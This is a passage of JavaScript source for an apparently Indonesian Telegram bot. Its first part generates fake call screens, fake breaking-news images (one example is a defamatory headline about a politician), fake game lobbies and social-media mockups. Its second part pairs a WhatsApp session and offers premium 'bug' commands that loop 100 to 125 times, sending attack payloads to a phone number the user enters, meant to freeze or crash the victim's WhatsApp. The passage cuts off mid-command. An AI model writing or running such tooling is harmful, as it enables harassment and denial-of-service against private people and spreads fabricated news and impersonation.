        const apiUrl = `https://api.azbry.com/api/maker/igc?url=${encodeURIComponent(linkProfil)}&name=${encodeURIComponent(namaGroup.trim())}&member=${encodeURIComponent(jumlahPeserta.trim())}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Successfully generated iPhone Group Chat\nGroup: ${namaGroup.trim()}`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while processing the data through the API.');
    }
});

bot.command('music', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Invalid format!\nUse: /music link_thumbnail | judul lagu\n\nContoh:\n/music https://example.com/cover.jpg | Cyberpunk 2026 Soundtrack');
    }

    const [imgUrl, musicName] = textInput.split('|');

    if (!imgUrl || !musicName) {
        return ctx.reply('Both fields are required! Make sure to use the | separator correctly.');
    }

    const cleanImgUrl = imgUrl.trim();

    if (!cleanImgUrl.startsWith('http://') && !cleanImgUrl.startsWith('https://')) {
        return ctx.reply('The first parameter must be a valid image thumbnail URL (starting with http/https)!');
    }

    await ctx.reply('Processing tampilan Music Player, please wait...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/music?img=${encodeURIComponent(cleanImgUrl)}&name=${encodeURIComponent(musicName.trim())}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Successfully generated Music Player!\n🎵 Lagu: ${musicName.trim()}`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while processing the image through the API.');
    }
});


bot.command('tanyaustadz', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');
    const ustadzQuery = textInput.trim();

    if (!ustadzQuery) {
        return ctx.reply('Invalid format!\nUse: /tanyaustadz [pertanyaan]\n\nContoh:\n/tanyaustadz Ustadz, bagaimana hukumnya memakai script orang lain?');
    }

    await ctx.reply('Processing Tanya Ustadz, please wait...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/tanyaustadz?text=${encodeURIComponent(ustadzQuery)}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: 'Successfully generated Mockup Tanya Ustadz',
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while processing the image through the API.');
    }
});


bot.command('threads', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Invalid format!\nGunakan urutan sesuai dokumentasi API:\n/threads nama | username | link_prof | isi_post | waktu\n\nContoh lengkap:\n/threads xyzen | xyzenofficial | https://link.com/pic.jpg | Halo Dunia | 5m');
    }

    const parts = textInput.split('|').map(p => p.trim());
    
    const name = parts[0];
    const username = parts[1];
    const pfp = parts[2];
    const textChat = parts[3];
    const waktu = parts[4];   

    if (!name || !textChat) {
        return ctx.reply('Gagal! Parameter Nama (ke-1) dan Isi Post (ke-4) are required.\n\nFormat: nama | username | link_pfp | isi_post | waktu');
    }

    await ctx.reply('Processing render tampilan Threads Post, please wait...');

    try {
        let apiUrl = `https://api.azbry.com/api/maker/threadspost?name=${encodeURIComponent(name)}&text=${encodeURIComponent(textChat)}`;
        
        if (username) apiUrl += `&username=${encodeURIComponent(username)}`;
        if (pfp) apiUrl += `&pfp=${encodeURIComponent(pfp)}`;
        if (waktu) apiUrl += `&waktu=${encodeURIComponent(waktu)}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Threads post created successfully!`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while processing the data through the API.');
    }
});

bot.command('fakecall', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Invalid format!\nGunakan pembatas |\n/fakecall nama_penelepon | durasi_waktu | link_foto_profil\n\nContoh:\n/fakecall Ayank | 00:00 | https://files.catbox.moe/a6mleu.png');
    }

    const [name, time, ppUrl] = textInput.split('|').map(p => p.trim());

    if (!name || !time || !ppUrl) {
        return ctx.reply('All fields (Nama, Waktu, dan Link PP) are required!');
    }

    if (!ppUrl.startsWith('http://') && !ppUrl.startsWith('https://')) {
        return ctx.reply('The third parameter must be a valid profile photo URL!');
    }

    await ctx.reply('Processing Generate tampilan panggilan palsu, please wait...');

    try {
        const apiUrl = `https://api.synoxcloud.xyz/canvas/fakecall?name=${encodeURIComponent(name)}&time=${encodeURIComponent(time)}&pp=${encodeURIComponent(ppUrl)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `*Successfully generated Fakecall!*`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while processing the fake call image through the API.');
    }
});

bot.command('idcard', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Invalid format!\nGunakan pembatas |\n/idcard nama | jabatan/title | nama_script | link_kontak\n\nContoh:\n/idcard Saurus | Creator | Api synox | https://t.me/lordsaurus');
    }

    const [name, title, script, contact] = textInput.split('|').map(p => p.trim());

    if (!name || !title || !script || !contact) {
        return ctx.reply('All fields (Nama, Title, Script, dan Kontak) must be filled in lengkap!');
    }

    await ctx.reply('Generating Developer ID Card, please wait.');

    try {
        const apiUrl = `https://api.synoxcloud.xyz/canvas/idcard?name=${encodeURIComponent(name)}&title=${encodeURIComponent(title)}&script=${encodeURIComponent(script)}&contact=${encodeURIComponent(contact)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: ` *Successfully generated Developer ID Card!*\n👤 Owner: *${name}*`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while processing the Developer ID Card.');
    }
});

bot.command('spotifycard', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Invalid format!\nGunakan pembatas |\n/spotifycard judul_lagu | nama_artis | link_cover_album\n\nContoh:\n/spotifycard Bergema sampai selamanya | Nadhif Basalamah | https://files.catbox.moe/9cn40e.png');
    }

    const [title, artist, coverUrl] = textInput.split('|').map(p => p.trim());

    if (!title || !artist || !coverUrl) {
        return ctx.reply('All fields (Judul, Artis, dan Link Cover) are required!');
    }

    if (!coverUrl.startsWith('http://') && !coverUrl.startsWith('https://')) {
        return ctx.reply('The third parameter must be a valid album cover URL!');
    }

    await ctx.reply('Generating Spotify Now Playing card please wait...');

    try {
        const apiUrl = `https://api.synoxcloud.xyz/canvas/spotifycard?title=${encodeURIComponent(title)}&artist=${encodeURIComponent(artist)}&cover=${encodeURIComponent(coverUrl)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `*Successfully generated Spotify Card!*\n🎵 *${title}* — ${artist}`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while retrieving Spotify image data from the API.');
    }
});

bot.command('ttqc', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Invalid format!\nGunakan pembatas |\n/ttqc username | teks_chat | link_avatar\n\nContoh:\n/ttqc Saurus | Just friend kok cemburu😸 | https://c.top4top.io/p_3827ycihz1.jpg');
    }

    const [username, textChat, avatarUrl] = textInput.split('|').map(p => p.trim());

    if (!username || !textChat || !avatarUrl) {
        return ctx.reply('All fields (Username, Teks Chat, dan Link Avatar) are required!');
    }

    if (!avatarUrl.startsWith('http://') && !avatarUrl.startsWith('https://')) {
        return ctx.reply('The third parameter must be a valid avatar URL!');
    }

    await ctx.reply('Generating TikTok Quote Chat, please wait.');

    try {
        const apiUrl = `https://api.synoxcloud.xyz/canvas/ttqc?username=${encodeURIComponent(username)}&text=${encodeURIComponent(textChat)}&avatar=${encodeURIComponent(avatarUrl)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `*Successfully generated TikTok Quote Chat!*`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while processing the data through the TikTok Canvas API.');
    }
});

bot.command('winquote', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');
    const quote = textInput.trim();

    if (!quote) {
        return ctx.reply('Invalid format!\nUse: /winquote [teks]\n\nContoh:\n/winquote kenapa nyahh aku salah mulu');
    }

    await ctx.reply('Processing Generate Windows Media Player Quotes, please wait...');

    try {
        const apiUrl = `https://api-nanzz.my.id/docs/api/maker/windows-quotes.php?text=${encodeURIComponent(quote)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: 'Successfully generated Windows Quotes!',
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while retrieving data from the API.');
    }
});


bot.command('lobbyff', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Invalid format!\nUse: /lobbyff nickname | versi_background\n\nContoh:\n/lobbyff Nanas | 9');
    }

    const [nickname, versi] = textInput.split('|').map(p => p.trim());

    if (!nickname || !versi || isNaN(versi)) {
        return ctx.reply('Failed! Nickname and version (must be numbers) are required.\n\nFormat: /lobbyff name | version');
    }

    await ctx.reply('Preparing your Free Fire lobby, please wait...');

    try {
        const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-lobby-ff.php?nickname=${encodeURIComponent(nickname)}&versi=${encodeURIComponent(versi)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Successfully generated Fake Lobby FF\n👤 Nickname: *${nickname}*\n🖼️ Background Version: *${versi}*`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred. Make sure the selected background version is available.');
    }
});

bot.command('lobbyml', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Invalid format!\nGunakan pembatas |\n/lobbyml username | link_avatar | rank | indeks_border\n\nContoh:\n/lobbyml Owiee | https://example.com/avatar.jpg | imo | 0\n\nPilihan Rank: epic, glory, gm, honor, imo, mawi, legend');
    }

    // Memecah parameter input
    const [username, avatarUrl, rank, border] = textInput.split('|').map(p => p.trim());

    // Validasi kelengkapan parameter
    if (!username || !avatarUrl || !rank || border === undefined || border === '') {
        return ctx.reply('All fields (Username, Link Avatar, Rank, dan Border) are required!\nFormat: /lobbyml nama | link | rank | border');
    }

    // Validasi link avatar
    if (!avatarUrl.startsWith('http://') && !avatarUrl.startsWith('https://')) {
        return ctx.reply('The second parameter must be a valid image avatar URL (starting with http/https)!');
    }

    // Validasi pilihan rank secara sederhana
    const validRanks = ['epic', 'glory', 'gm', 'honor', 'imo', 'mawi', 'legend'];
    if (!validRanks.includes(rank.toLowerCase())) {
        return ctx.reply(`Rank tidak valid! Pilih salah satu dari: ${validRanks.join(', ')}`);
    }

    await ctx.reply('Processing Generate Fake Lobby MLBB, please wait...');

    try {
        // Menyusun URL API sesuai struktur dokumentasi nanzzapi
        const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-lobby-ml.php?username=${encodeURIComponent(username)}&avatar=${encodeURIComponent(avatarUrl)}&rank=${encodeURIComponent(rank.toLowerCase())}&border=${encodeURIComponent(border)}`;
        
        // Mengunduh hasil gambar sebagai buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        // Sending to Telegram
        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Successfully generated Fake Lobby MLBB\n👤 Nickname: ${username}\n🏅 Rank: ${rank.toUpperCase()}\n🖼️ Border ID: *${border}*`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while processing the image through the API. Make sure all parameters are filled in correctly.');
    }
});

bot.command('storyig', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Invalid format!\nGunakan pembatas |\n/storyig nama_user | teks_story | link_gambar_background\n\nContoh:\n/storyig John Doe | Hello World | https://example.com/bg.jpg');
    }

    const [name, textStory, bgUrl] = textInput.split('|').map(p => p.trim());

    if (!name || !textStory || !bgUrl) {
        return ctx.reply('All fields (Nama, Teks, dan Link Gambar) are required dengan benar!');
    }

    if (!bgUrl.startsWith('http://') && !bgUrl.startsWith('https://')) {
        return ctx.reply('The third parameter must be a valid image background URL!');
    }

    await ctx.reply('Processing Generate Instagram Story Mockup, please wait...');

    try {
        // Because the web endpoint accepts POST file data, the data is sent via form-data / URL parameters when supported.
        const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-story-ig.php?name=${encodeURIComponent(name)}&text=${encodeURIComponent(textStory)}&url=${encodeURIComponent(bgUrl)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Successfully generated Instagram Story!`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while processing the Instagram Story mockup.');
    }
});

bot.command('berita', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Invalid format!\nGunakan pembatas |\n/berita judul_berita | link_gambar_berita\n\nContoh:\n/berita Viral! Jokowi mencuri 19jt lapangan pekerjaan | https://example.com/jokowi.webp');
    }

    const [judul, imgUrl] = textInput.split('|').map(p => p.trim());

    if (!judul || !imgUrl) {
        return ctx.reply('Both fields (Judul Berita & Link Gambar) are required!');
    }

    if (!imgUrl.startsWith('http://') && !imgUrl.startsWith('https://')) {
        return ctx.reply('The second parameter must be a valid news image URL!');
    }

    await ctx.reply('Processing Generate iNews Breaking News, please wait...');

    try {
        const apiUrl = `https://api-nanzz.my.id/docs/api/maker/berita.php?text=${encodeURIComponent(judul)}&url=${encodeURIComponent(imgUrl)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Successfully generated Fake Breaking News!\n📰 Berita: ${judul}`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while processing the news image through the API.');
    }
});

bot.command('randompap', async (ctx) => {
    await ctx.reply('Searching for a random PAP image, please wait...');

    try {
        const apiUrl = 'https://api-nanzz.my.id/docs/api/random/random-pap.php';
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: '*📸 Random PAP retrieved successfully!*',
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while retrieving image data from the API. Please try again later.');
    }
});

bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example: /addadmin 12345678");
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} already has status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ User ${userId} now has akses admin!`);
});

bot.command("addprem", checkOwner, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} already has akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ User ${userId} is now a premium user.`);
});

bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /deladmin 12345678");
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ User ${userId} is not in the list of Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 User ${userId} has been removed from daftar Admin.`);
});

bot.command("delprem", checkOwner, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /delprem 12345678");
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ User ${userId} is not in the list of premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 User ${userId} has been removed from akses premium.`);
});

bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ You are a premium user.`);
  } else {
    return ctx.reply(`❌ You are not a premium user.`);
  }
});

const vidthumbnail = "https://files.catbox.moe/jpfacn.png";
bot.command("connect", async (ctx) => {
   // Pairing is now available to all users.
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /connect 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Invalid number");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp is already connected with number: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "FGMAFIAN");  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆  ⎭ ⊰―—═⬡</pre></blockquote>
⬡ Number: ${phoneNumber}
⬡ Pairing Code: ${formattedCode}
⬡ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(vidthumbnail, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆  ⎭ ⊰―—═⬡</pre></blockquote>
⬡ Number: ${lastPairingMessage.phoneNumber}
⬡ Pairing Code: ${lastPairingMessage.pairingCode}
⬡ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆  ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != OWNER_IDS) {
    return ctx.reply("❌ ☇ Access for owner only");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session deleted successfully; the panel will restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "✅ Connected"
      : "❌ Tidak Connected";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});

// CASE BUG RICH BY 𝑭𝑮 𝑴𝑨𝑭𝑰𝑨𝑵
bot.command("delay-hard", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const Icon_satus = HTML.customEmoji("5922612721244704425", "🔄")
  const Icon_ytta = HTML.customEmoji("5913787972200698358", "🤫")
  const Icon_andro = HTML.customEmoji("5316538972594274208", "🤖")
  const Icon_target = HTML.customEmoji("5253959125838090076", "🎯") 
  const Icon_ssc = HTML.customEmoji("5316827280863934685", "⚡")
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : / delay-hard 234xxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // ============ DRAFT PRIVATE CHAT ONLY ============
  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ processing target ${q}...`)).build()
    );
  }

  // ============ RICH MESSAGE IS STILL SENT TO ALL CHATS ============
  const richContent = new HTML()
    .slideshow(`<img src="${PHOTOS[0]}"/>`)
    .heading(2, HTML.customEmoji("5897994140502724035", "🕷") + " 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆  Vvip")
    .divider()
    .raw(`
      <table bordered striped>
        <tr><th>Detail</th><th>Informasi</th></tr>
        <tr><td>${Icon_target} Target</td><td>+${q.replace(/[^0-9]/g, "")}</td></tr>
        <tr><td>${Icon_satus} Status</td><td>Sucess Send Bugs ${Icon_ssc}</td></tr>
        <tr><td>${Icon_ytta} Type</td><td>Delay Bebas spam ${Icon_andro}</td></tr>
      </table>
    `)
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: `𝐂𝐡𝐞𝐜𝐤 𝐓𝐚𝐫𝐠𝐞𝐭`, url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "5116414868357907335"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variable 'sock' not found or WhatsApp is not connected.");
    }
    
    for (let r = 0; r < 100; r++) {
      await delayHard1(sock, target);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Failed to Send")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});

bot.command("bxtdelay", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const Icon_satus = HTML.customEmoji("5922612721244704425", "🔄")
  const Icon_ytta = HTML.customEmoji("5913787972200698358", "🤫")
  const Icon_andro = HTML.customEmoji("5316538972594274208", "🤖")
  const Icon_target = HTML.customEmoji("5253959125838090076", "🎯") 
  const Icon_ssc = HTML.customEmoji("5316827280863934685", "⚡")
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /btxdelay 234xxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // ============ DRAFT PRIVATE CHAT ONLY ============
  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ processing target ${q}...`)).build()
    );
  }

  // ============ RICH MESSAGE IS STILL SENT TO ALL CHATS ============
  const richContent = new HTML()
    .slideshow(`<img src="${PHOTOS[0]}"/>`)
    .heading(2, HTML.customEmoji("5897994140502724035", "🕷") + " 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆  Vvip")
    .divider()
    .raw(`
      <table bordered striped>
        <tr><th>Detail</th><th>Informasi</th></tr>
        <tr><td>${Icon_target} Target</td><td>+${q.replace(/[^0-9]/g, "")}</td></tr>
        <tr><td>${Icon_satus} Status</td><td>Sucess Send Bugs ${Icon_ssc}</td></tr>
        <tr><td>${Icon_ytta} Type</td><td>Delay Bebas spam ${Icon_andro}</td></tr>
      </table>
    `)
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: true },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: `𝐂𝐡𝐞𝐜𝐤 𝐓𝐚𝐫𝐠𝐞𝐭`, url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "5116414868357907335"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variable 'sock' not found or WhatsApp is not connected.");
    }
    
    for (let r = 0; r < 125; r++) {
      await DelayAyaa(sock, target);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Failed to Send")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});

bot.command("nulldelay", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const Icon_satus = HTML.customEmoji("5922612721244704425", "🔄")
  const Icon_ytta = HTML.customEmoji("5913787972200698358", "🤫")
  const Icon_andro = HTML.customEmoji("5316538972594274208", "🤖")
  const Icon_target = HTML.customEmoji("5253959125838090076", "🎯") 
  const Icon_ssc = HTML.customEmoji("5316827280863934685", "⚡")
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /nulldelay 234xxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // ============ DRAFT PRIVATE CHAT ONLY ============
  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ processing target ${q}...`)).build()
    );
  }

  // ============ RICH MESSAGE IS STILL SENT TO ALL CHATS ============
  const richContent = new HTML()
    .slideshow(`<img src="${PHOTOS[0]}"/>`)
    .heading(2, HTML.customEmoji("5897994140502724035", "🕷") + " 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆  Vvip")
    .divider()
    .raw(`
      <table bordered striped>
        <tr><th>Detail</th><th>Informasi</th></tr>
        <tr><td>${Icon_target} Target</td><td>+${q.replace(/[^0-9]/g, "")}</td></tr>
        <tr><td>${Icon_satus} Status</td><td>Sucess Send Bugs ${Icon_ssc}</td></tr>
        <tr><td>${Icon_ytta} Type</td><td>Delay Bebas spam ${Icon_andro}</td></tr>
      </table>
    `)
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: true },
      { text: "Anti Kenon 80%", checked: true }
